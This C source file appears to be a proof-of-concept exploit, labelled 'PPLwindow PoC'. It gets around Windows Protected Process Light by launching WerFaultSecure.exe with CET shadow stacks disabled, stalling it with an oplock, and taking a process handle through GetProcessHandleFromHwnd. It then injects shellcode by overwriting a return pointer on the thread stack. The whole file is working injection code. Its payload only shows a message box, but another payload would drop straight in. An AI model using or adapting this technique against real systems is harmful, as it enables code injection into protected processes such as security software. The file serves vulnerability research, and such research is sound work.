#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>
#include <winnt.h>

#include "OpLock.h"

#pragma warning( disable : 6387)

static LPPROC_THREAD_ATTRIBUTE_LIST CreateMitigationPolicyProcAttribute(DWORD64 mitigation)
{
    SIZE_T ptsize = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST ptal;

    InitializeProcThreadAttributeList(NULL, 1, 0, &ptsize);
    ptal = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, ptsize);
    if (!ptal)
    {
        return NULL;
    }
    if (!InitializeProcThreadAttributeList(ptal, 1, 0, &ptsize))
    {
        return NULL;
    }
    if (!UpdateProcThreadAttribute(ptal, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &mitigation, sizeof(DWORD64), NULL, NULL))
    {
        return NULL;
    }
    return ptal;
}

static void DestroyMitigationPolicyProcAttribute(LPPROC_THREAD_ATTRIBUTE_LIST ptal)
{
    DeleteProcThreadAttributeList(ptal);
    HeapFree(GetProcessHeap(), 0, ptal);
}

static BOOL CreateProtectedProcessSuspended(WCHAR* cmdline, PROCESS_INFORMATION* pi)
{
    BOOL retval = FALSE;
    STARTUPINFOEXW si = { 0 };
    
    if (!pi)
    {
        return FALSE;
    }

    memset(pi, 0, sizeof(PROCESS_INFORMATION));
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK;
    si.lpAttributeList = CreateMitigationPolicyProcAttribute(PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_OFF);
    // | PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF | PROCESS_CREATION_MITIGATION_POLICY2_STRICT_CONTROL_FLOW_GUARD_ALWAYS_OFF

    if (!si.lpAttributeList)
    {
        return FALSE;
    }

    retval = CreateProcessW(NULL, cmdline, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_PROTECTED_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFOW*)&si, pi);
    DestroyMitigationPolicyProcAttribute(si.lpAttributeList);
    return retval;
}

static HWND FindWindowForPID(DWORD pid, const WCHAR* wclass, const WCHAR* wtitle)
{
    HWND lasthwnd = NULL;
    DWORD lastpid = 0;

    if (!wclass && !wtitle)
    {
        return NULL;
    }
    if (!pid)
    {
        return NULL;
    }

    lasthwnd = NULL;
    do
    {
        lasthwnd = FindWindowExW(NULL, lasthwnd, wclass, wtitle);
        lastpid = 0;
        GetWindowThreadProcessId(lasthwnd, &lastpid);
        if (lastpid == pid)
        {
            return lasthwnd;
        }
    }
    while (lasthwnd);
    return NULL;
}

typedef HANDLE(WINAPI* __GetProcessHandleFromHwnd)(HWND hwnd);

static HANDLE CallGetProcessHandleFromHwnd(HWND hwnd)
{
    HMODULE oleacc = NULL;
    __GetProcessHandleFromHwnd _GetProcessHandleFromHwnd = NULL;
    HANDLE process = NULL;
    DWORD lasterror = 0;

    if (!hwnd)
    {
        return NULL;
    }
    lasterror = 0;
    oleacc = LoadLibraryW(L"oleacc.dll");
    if (oleacc)
    {
        _GetProcessHandleFromHwnd = (__GetProcessHandleFromHwnd)GetProcAddress(oleacc, "GetProcessHandleFromHwnd");
        if (_GetProcessHandleFromHwnd)
        {
            process = _GetProcessHandleFromHwnd(hwnd);
        }
        lasterror = GetLastError();
        FreeLibrary(oleacc);
        SetLastError(lasterror);
    }
    return process;
}

typedef NTSTATUS (NTAPI * __NtSuspendProcess)(HANDLE ProcessHandle);

static NTSTATUS CallNtSuspendProcess(HANDLE ProcessHandle)
{
    HMODULE ntdll = NULL;
    __NtSuspendProcess _NtSuspendProcess = NULL;
    NTSTATUS status = 0xC000007A;

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll)
    {
        _NtSuspendProcess = (__NtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
        if (_NtSuspendProcess)
        {
            status = _NtSuspendProcess(ProcessHandle);
        }
    }

    return status;
}

typedef NTSTATUS (NTAPI * __NtResumeProcess)(HANDLE ProcessHandle);

static NTSTATUS CallNtResumeProcess(HANDLE ProcessHandle)
{
    HMODULE ntdll = NULL;
    __NtResumeProcess _NtResumeProcess = NULL;
    NTSTATUS status = 0xC000007A;

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll)
    {
        _NtResumeProcess = (__NtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess");
        if (_NtResumeProcess)
        {
            status = _NtResumeProcess(ProcessHandle);
        }
    }

    return status;
}

typedef struct _PPLWINDOW_PROCESS_INFORMATION {
    PROCESS_INFORMATION pi;
    HANDLE hwnd_process;
} PPLWINDOW_PROCESS_INFORMATION, *PPPLWINDOW_PROCESS_INFORMATION;

static void ClosePPLwindowProcessHandles(PPPLWINDOW_PROCESS_INFORMATION pplwindow_pi)
{
    if (pplwindow_pi)
    {
        if (pplwindow_pi->hwnd_process)
        {
            CloseHandle(pplwindow_pi->hwnd_process);
            pplwindow_pi->hwnd_process = NULL;
        }
        if (pplwindow_pi->pi.hThread)
        {
            CloseHandle(pplwindow_pi->pi.hThread);
            pplwindow_pi->pi.hThread = NULL;
        }
        if (pplwindow_pi->pi.hProcess)
        {
            CloseHandle(pplwindow_pi->pi.hProcess);
            pplwindow_pi->pi.hProcess = NULL;
        }
    }
}

static BOOL CreatePPLwindowProcess(WCHAR* cmdline, const WCHAR* window_class, const WCHAR* window_title, const WCHAR* lock_dll, DWORD oplock_timeout, PPPLWINDOW_PROCESS_INFORMATION pplwindow_pi)
{
    OPLOCK_FILE_CONTEXT ofc = { 0 };
    NTSTATUS status = 0;
    HWND hwnd = NULL;
    int i = 0;

    if (!pplwindow_pi)
    {
        return FALSE;
    }
    if (!oplock_timeout)
    {
        oplock_timeout = 3000;
    }

    if (!CreateProtectedProcessSuspended(cmdline, &pplwindow_pi->pi))
    {
        wprintf(L"CreateProtectedProcessSuspended() failed: %u\n", (unsigned int)GetLastError());
        return FALSE;
    }
    wprintf(L"Created Process ID: %u\n", pplwindow_pi->pi.dwProcessId);

    ofc.len = sizeof(ofc);
    wprintf(L"Try oplock: %ls\n", lock_dll);
    if (!OpLockFile(lock_dll, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, TRUE, &ofc))
    {
        wprintf(L"OpLockFile() failed: %u\n", (unsigned int)GetLastError());
        TerminateProcess(pplwindow_pi->pi.hProcess, 0);
        ClosePPLwindowProcessHandles(pplwindow_pi);
        return FALSE;
    }
    if (!ResumeThread(pplwindow_pi->pi.hThread) == (DWORD)-1)
    {
        wprintf(L"ResumeThread() failed: %u\n", (unsigned int)GetLastError());
        ReleaseOpLock(&ofc);
        TerminateProcess(pplwindow_pi->pi.hProcess, 0);
        ClosePPLwindowProcessHandles(pplwindow_pi);
        return FALSE;
    }
    wprintf(L"Wait for oplock hit (%u) ...\n", (unsigned int)oplock_timeout);
    if (!WaitForOpLock(&ofc, oplock_timeout))
    {
        wprintf(L"WaitForOpLock() failed: %u\n", (unsigned int)GetLastError());
        ReleaseOpLock(&ofc);
        TerminateProcess(pplwindow_pi->pi.hProcess, 0);
        ClosePPLwindowProcessHandles(pplwindow_pi);
        return FALSE;
    }
    wprintf(L"Oplock hit\n");
    for (i = 0; i < 15; ++i)
    {
        hwnd = FindWindowForPID(pplwindow_pi->pi.dwProcessId, window_class, window_title);
        if (hwnd)
        {
            break;
        }
        Sleep(100);
    }
    if (!hwnd)
    {
        wprintf(L"FindWindowForPID() failed: %u\n", (unsigned int)GetLastError());
        ReleaseOpLock(&ofc);
        TerminateProcess(pplwindow_pi->pi.hProcess, 0);
        ClosePPLwindowProcessHandles(pplwindow_pi);
        return FALSE;
    }
    wprintf(L"WERFault window HWND: %p\n", (void*)hwnd);
    status = CallNtSuspendProcess(pplwindow_pi->pi.hProcess);
    if (status)
    {
        wprintf(L"NtSuspendProcess() failed: 0x%X\n", (unsigned int)status);
        ReleaseOpLock(&ofc);
        TerminateProcess(pplwindow_pi->pi.hProcess, 0);
        ClosePPLwindowProcessHandles(pplwindow_pi);
        return FALSE;
    }
    ReleaseOpLock(&ofc);

    pplwindow_pi->hwnd_process = CallGetProcessHandleFromHwnd(hwnd);
    if (!pplwindow_pi->hwnd_process)
    {
        wprintf(L"GetProcessHandleFromHwnd() failed: %u\n", (unsigned int)GetLastError());
        TerminateProcess(pplwindow_pi->pi.hProcess, 0);
        ClosePPLwindowProcessHandles(pplwindow_pi);
        return FALSE;
    }
    wprintf(L"PPLwindow process handle: %p\n", (void*)pplwindow_pi->hwnd_process);
    return TRUE;
}

static BOOL PPLwindowWerFaultSecure(WCHAR* werfaultsecure_args, DWORD oplock_timeout, PPPLWINDOW_PROCESS_INFORMATION pplwindow_pi)
{
    WCHAR lock_dll[100] = { 0 };
    WCHAR cmdline[MAX_PATH] = { 0 };

    if (!pplwindow_pi)
    {
        return FALSE;
    }
    if (werfaultsecure_args)
    {
        if (lstrlenW(werfaultsecure_args) > 140)
        {
            return FALSE;
        }
    }
    cmdline[0] = L'\"';
    if (!GetSystemDirectoryW(lock_dll, 80))
    {
        return FALSE;
    }
    lstrcatW(lock_dll, L"\\");
    lstrcpyW(&cmdline[1], lock_dll);
    lstrcatW(cmdline, L"WerFaultSecure.exe\"");
    lstrcatW(lock_dll, L"windows.storage.dll");
    if (werfaultsecure_args)
    {
        lstrcatW(cmdline, L" ");
        lstrcatW(cmdline, werfaultsecure_args);
    }

    return CreatePPLwindowProcess(cmdline, L"WerFaultWndClass", NULL, lock_dll, oplock_timeout, pplwindow_pi);
}

#define ThreadBasicInformation ((int)0)

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    KAFFINITY AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

#define STACK_COPY_SIZE 0x1000

typedef NTSTATUS (NTAPI * __NtQueryInformationThread)(
    HANDLE ThreadHandle,
    int ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength,
    PULONG ReturnLength
);

static PVOID OverwriteBaseThreadInitPointer(HANDLE process, HANDLE thread, PVOID pointer)
{
    HMODULE kernel32 = NULL;
    HMODULE ntdll = NULL;
    __NtQueryInformationThread _NtQueryInformationThread = NULL;
    THREAD_BASIC_INFORMATION tbi = { 0 };
    ULONG_PTR cmp_addr_low = 0;
    ULONG_PTR cmp_addr_high = 0;
    BYTE* teb = NULL;
    BYTE* stackbase = NULL;
    BYTE stackcopy[STACK_COPY_SIZE] = { 0 };
    ULONG_PTR* stack_ptr_low = 0;
    ULONG_PTR* stack_ptr_high = 0;
    ULONG_PTR mainfunc = 0;
    LPVOID stack_target = NULL;
    NTSTATUS status = 0;
    ULONG retlen = 0;
    LONG_PTR diff = 0;

    kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32)
    {
        return NULL;
    }
    cmp_addr_low = (ULONG_PTR)GetProcAddress(kernel32, "BaseThreadInitThunk");
    if (!cmp_addr_low)
    {
        return NULL;
    }
    cmp_addr_high = cmp_addr_low + 0x100;
    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!kernel32)
    {
        return NULL;
    }
    _NtQueryInformationThread = (__NtQueryInformationThread)GetProcAddress(ntdll, "NtQueryInformationThread");
    if (!_NtQueryInformationThread)
    {
        return NULL;
    }

    retlen = sizeof(tbi);
    status = _NtQueryInformationThread(thread, ThreadBasicInformation, (LPVOID)&tbi, retlen, &retlen);
    if (status)
    {
        wprintf(L"NtQueryInformationThread() failed: 0x%X\n", (unsigned int)status);
        return NULL;
    }

    wprintf(L"TEB address: %p\n", (void*)tbi.TebBaseAddress);
    teb = (BYTE*)tbi.TebBaseAddress;
    if (!teb)
    {
        return NULL;
    }
    if (!ReadProcessMemory(process, (LPCVOID)&teb[sizeof(void*)], (LPVOID)&stackbase, sizeof(void*), NULL))
    {
        wprintf(L"ReadProcessMemory() failed: %u\n", (unsigned int)GetLastError());
        return NULL;
    }
    wprintf(L"Stackbase: %p\n", (void*)stackbase);
    if (!stackbase)
    {
        return NULL;
    }
    if (!ReadProcessMemory(process, (LPCVOID)&stackbase[-STACK_COPY_SIZE], stackcopy, STACK_COPY_SIZE, NULL))
    {
        wprintf(L"ReadProcessMemory() 2 failed: %u\n", (unsigned int)GetLastError());
        return NULL;
    }
    stack_ptr_low = (ULONG_PTR*)&stackcopy[STACK_COPY_SIZE - sizeof(ULONG_PTR)];
    stack_ptr_high = (ULONG_PTR*)stackcopy;
    mainfunc = 0;
    while (stack_ptr_low >= stack_ptr_high)
    {
        if (*stack_ptr_low > cmp_addr_low && *stack_ptr_low < cmp_addr_high)
        {
            stack_ptr_low -= 7;
            while((*stack_ptr_low) < 0x10000)
            {
                --stack_ptr_low;
            }
            mainfunc = *stack_ptr_low;
            break;
        }
        --stack_ptr_low;
    }
    if (mainfunc)
    {
        diff = (LONG_PTR)&stackcopy[STACK_COPY_SIZE] - (LONG_PTR)stack_ptr_low;
        stack_target = (LPVOID)&stackbase[-diff];
        wprintf(L"Stack target address: %p\n", (void*)stack_target);
        if (!WriteProcessMemory(process, stack_target, (LPCVOID)&pointer, sizeof(PVOID), NULL))
        {
            wprintf(L"WriteProcessMemory() failed: %u\n", (unsigned int)GetLastError());
            return NULL;
        }
    }
    return (PVOID)mainfunc;
}

BYTE shellcode[] = {
    0x48, 0xB8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,                                     // mov rax, old_return
    0x50,                                                                                           // push rax
    0xE8, 0x10, 0x00, 0x00, 0x00,                                                                   // call 0x15
    0x21, 0x50, 0x50, 0x4C, 0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x20, 0x50, 0x6F, 0x43, 0x21, 0x00, // db "!PPLwindow PoC!\0"
    0x5A,                                                                                           // pop edx
    0x48, 0x31, 0xC9,                                                                               // xor rcx, rcx
    0x4D, 0x31, 0xC0,                                                                               // xor r8, r8
    0x4D, 0x31, 0xC9,                                                                               // xor r9, r9
    0x48, 0x83, 0xEC, 0x28,                                                                         // sub rsp, 0x28
    0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,                                     // mov rax, MessageBoxA
    0xFF, 0xD0,                                                                                     // call rax
    0x48, 0x83, 0xC4, 0x28,                                                                         // add rsp, 0x38
    0xC3                                                                                            // ret
};

static BOOL ReplaceShellcodePointer(BYTE* shellcode_ptr, ULONG_PTR pattern, DWORD shellcode_len, ULONG_PTR pointer)
{
    DWORD i = 0;

    for (i = 0; i < (shellcode_len - sizeof(ULONG_PTR) + 1); ++i)
    {
        if (*(ULONG_PTR*)&shellcode_ptr[i] == pattern)
        {
            *(ULONG_PTR*)&shellcode_ptr[i] = pointer;
            return TRUE;
        }
    }
    return FALSE;
}

static PVOID GetAPIPointer(WCHAR* dllname, char* procedure)
{
    HMODULE mod = NULL;
    FARPROC prod = NULL;

    mod = LoadLibraryW(dllname);
    if (!mod)
    {
        return NULL;
    }
    prod = GetProcAddress(mod, procedure);
    FreeLibrary(mod);
    return (PVOID)prod;
}

static BOOL PlacePayload(HANDLE process, HANDLE thread)
{
    PVOID payload = NULL;
    DWORD oldprot = 0;
    ULONG_PTR basethreadinitthunk_ptr = 0;
    ULONG_PTR messageboxa = 0;

    messageboxa = (ULONG_PTR)GetAPIPointer(L"user32.dll", "MessageBoxA");
    if (!messageboxa)
    {
        wprintf(L"GetAPIPointer() failed: %u\n", (unsigned int)GetLastError());
        return FALSE;
    }
    ReplaceShellcodePointer(shellcode, 0x1122334455667788, sizeof(shellcode), messageboxa);

    payload = VirtualAllocEx(process, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!payload)
    {
        wprintf(L"VirtualAllocEx() failed: %u\n", (unsigned int)GetLastError());
        return FALSE;
    }
    wprintf(L"Memory allocated: %p\n", payload);
    if (!VirtualProtectEx(process, payload, 0x1000, PAGE_READWRITE, &oldprot))
    {
        wprintf(L"VirtualProtectEx() failed: %u\n", (unsigned int)GetLastError());
        return FALSE;
    }

    basethreadinitthunk_ptr = (ULONG_PTR)OverwriteBaseThreadInitPointer(process, thread, payload);
    if (!basethreadinitthunk_ptr)
    {
        wprintf(L"OverwriteBaseThreadInitPointer() failed: %u\n", (unsigned int)GetLastError());
        return FALSE;
    }

    ReplaceShellcodePointer(shellcode, 0x8877665544332211, sizeof(shellcode), basethreadinitthunk_ptr);

    if (!WriteProcessMemory(process, payload, shellcode, sizeof(shellcode), NULL))
    {
        wprintf(L"WriteProcessMemory() 2 failed: %u\n", (unsigned int)GetLastError());
        return FALSE;
    }
    if (!VirtualProtectEx(process, payload, 0x1000, oldprot, &oldprot))
    {
        wprintf(L"VirtualProtectEx() 2 failed: %u\n", (unsigned int)GetLastError());
        return FALSE;
    }
    wprintf(L"Shellcode delivered!\n");

    return TRUE;
}

int wmain(int argc, WCHAR** argv)
{
    SECURITY_ATTRIBUTES sa = { 0 };
    HANDLE mapping = NULL;
    WCHAR werfaultsecure_args[140];
    unsigned int handle_value = 0;
    PPLWINDOW_PROCESS_INFORMATION pplwindow_pi = { 0 };

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    mapping = CreateFileMappingW(INVALID_HANDLE_VALUE, &sa, PAGE_READWRITE, 0, 0x1000, NULL);
    if (mapping)
    {
        handle_value = (unsigned int)(ULONG_PTR)mapping;
    }
    else
    {
        handle_value = 12; // random value
    }
    
    wsprintfW(werfaultsecure_args, L"-u -p %u -s %u", (unsigned int)GetCurrentProcessId(), handle_value);
    if (!PPLwindowWerFaultSecure(werfaultsecure_args, 3000, &pplwindow_pi))
    {
        return 1;
    }
    if (mapping)
    {
        CloseHandle(mapping);
    }

    if (!PlacePayload(pplwindow_pi.hwnd_process, pplwindow_pi.pi.hThread))
    {
        TerminateProcess(pplwindow_pi.pi.hProcess, 0);
        ClosePPLwindowProcessHandles(&pplwindow_pi);
        return 1;
    }

    CallNtResumeProcess(pplwindow_pi.pi.hProcess);
    ClosePPLwindowProcessHandles(&pplwindow_pi);

    return 0;
}
